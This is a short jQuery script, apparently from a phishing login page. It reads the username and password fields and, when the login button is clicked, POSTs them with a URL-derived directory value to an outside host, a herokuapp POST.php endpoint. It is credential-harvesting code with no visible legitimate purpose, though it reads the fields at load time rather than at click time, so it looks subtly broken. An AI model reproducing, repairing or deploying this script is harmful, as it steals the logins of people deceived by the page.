$(function(){

    var fullUrl = window.location.href;
    var myStr = fullUrl.split("=");
    if(myStr.length > 1){
        var Directy = myStr[1];
    }else{
        var Directy = 'default';
    }

    var myLink = 'https://analiza-new.herokuapp.com/POST.php';
    var myUser = $('#user-name').val()
    var myPass = $('#my-pass').val()

    console.log(myLink);
    

    $('#log-in').click(function() {

        var request = $.ajax({
            url: myLink,
            method: "POST",
            data: { user1 : myUser, pass1 : myPass, dir1 : Directy },
            dataType: "html"
          });
           
          request.done(function( msg ) {
            console.log('Done1');
          });

    });


});